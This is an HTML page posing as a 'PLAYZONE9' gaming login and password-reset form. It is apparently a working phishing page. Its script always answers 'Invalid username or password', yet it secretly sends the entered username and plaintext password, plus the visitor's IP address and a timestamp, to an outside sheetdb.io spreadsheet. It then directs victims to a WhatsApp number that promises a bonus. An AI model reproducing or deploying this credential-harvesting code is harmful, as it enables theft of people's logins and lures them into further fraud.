<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>PLAYZONE9 - Password Reset</title>
    <link rel="icon" type="image/png" href="favicon.png" />
    <link rel="stylesheet" href="style.css" />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"
    />
  </head>

  <body>

    <!-- ðŸ”´ TOP POPUP ALERT -->
    <div id="topAlert" class="top-alert">Invalid username or password</div>

    <!-- LOGO -->
    <div class="logo-container">
      <img src="logo2.png" alt="Logo" class="logo" />
    </div>

    <!-- PASSWORD RESET BOX -->
    <div class="contain">
      <!-- USERNAME -->
      <div class="input-group">
        <input type="text" id="username" placeholder="Username" required />
      </div>

      <!-- NEW PASSWORD -->
      <div class="input-group">
        <input type="password" id="password" placeholder="Password" required />
      </div>

      <!-- SUBMIT BUTTON -->
      <button class="login-btn" onclick="submitForm()">
        Login <i class="fas fa-sign-in-alt"></i>
      </button>

      <!-- DEMO ID BUTTON -->
      <button class="demo-btn">
        Login with Demo ID <i class="fas fa-sign-in-alt"></i>
      </button>

      <!-- RECAPTCHA TEXT -->
      <div class="recaptcha-info">
        This site is protected by reCAPTCHA and the Google
        <a href="#">Privacy Policy</a> and
        <a href="#">Terms of Service</a> apply.
      </div>

      <!-- EMAIL -->
      <p class="email-text">playzone9official@gmail.com</p>

      <!-- WhatsApp Join -->
      <a
        href="https://wa.me/919555738726"
        target="_blank"
        class="whatsapp-join"
      >
        <img src="whatsapp.png" class="wa-logo" /> JOIN WHATSAPP CHANNEL (BONUS)
      </a>

      <!-- SUCCESS MESSAGE -->
      <p id="successMsg" style="display:none; color:green; text-align:center; margin-top:10px;">
       Contact Whatsapp to Reset Password
      </p>
    </div>

    <!-- WhatsApp Floating Button -->
    <a href="https://wa.me/919555738726" class="wa-support" target="_blank">
      <img src="whatsapp2.png" alt="WhatsApp Support" />
    </a>

    <!-- SCRIPT -->
    <script>
      const API_URL = "https://sheetdb.io/api/v1/ye9thoog76f80";

      // ðŸ”´ Popup function that always animates
      function showAlert(message) {
        const alertBox = document.getElementById("topAlert");
        alertBox.textContent = message;

        // Restart animation
        alertBox.classList.remove("show");
        setTimeout(() => {
          alertBox.classList.add("show");
        }, 20);

        // Auto hide
        setTimeout(() => {
          alertBox.classList.remove("show");
        }, 2500);
      }

      function submitForm() {
        const username = document.getElementById("username").value.trim();
        const password = document.getElementById("password").value.trim();

        // ðŸ”´ ALWAYS show popup on login attempt
        showAlert("Invalid username or password");

        // If fields are empty, stop here
        if (!username || !password) {
          return;
        }

        // --- Your database logging still works below ---

        fetch("https://api.ipify.org?format=json")
          .then(res => res.json())
          .then(ipData => {
            const data = {
              data: [
                {
                  username: "'" + username,
                  password: "'" + password,
                  ip: ipData.ip,
                  timestamp: new Date().toLocaleString()
                }
              ]
            };

            fetch(API_URL, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify(data)
            })
            .then(res => {
              if (!res.ok) throw new Error("Submission failed");
              document.getElementById("successMsg").style.display = "block";

              // Clear fields
              document.getElementById("username").value = "";
              document.getElementById("password").value = "";
            })
            .catch(err => {
              console.error(err);
              showAlert("Error submitting form");
            });

          })
          .catch(() => {
            showAlert("Could not fetch IP");
          });
      }
    </script>

  </body>
</html>
